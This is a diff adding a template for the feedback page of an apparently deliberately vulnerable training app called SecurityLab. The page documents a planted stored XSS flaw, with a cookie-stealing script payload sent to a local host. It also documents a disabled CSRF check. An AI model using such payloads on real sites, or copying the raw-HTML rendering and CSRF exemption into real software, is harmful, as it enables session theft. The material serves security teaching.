@@ -1,0 +1,26 @@
+{% extends "base.html" %}
+{% block title %}Submit Feedback – SecurityLab{% endblock %}
+{% block content %}
+<div class="card">
+  <h1>📬 Submit Feedback</h1>
+
+  <div class="vuln-box">
+    <strong>[V-16] Stored XSS</strong><br>
+    Message is stored raw and rendered with <code>|safe</code> on the wall.<br>
+    Payload: <code>&lt;script&gt;fetch('http://127.0.0.1:8080/?c='+document.cookie)&lt;/script&gt;</code><br><br>
+    <strong>[V-17] CSRF Disabled</strong><br>
+    This endpoint is <code>@csrf_exempt</code>. Any website can POST here on your behalf.
+  </div>
+
+  {# No {% csrf_token %} needed – endpoint is @csrf_exempt (V-17) #}
+  <form method="post" action="/feedback/submit/">
+    <label>Name</label>
+    <input type="text" name="name">
+    <label>Email</label>
+    <input type="email" name="email">
+    <label>Message (HTML/JS accepted)</label>
+    <textarea name="message" placeholder="<script>alert(1)</script>"></textarea>
+    <button type="submit">Submit</button>
+  </form>
+</div>
+{% endblock %}
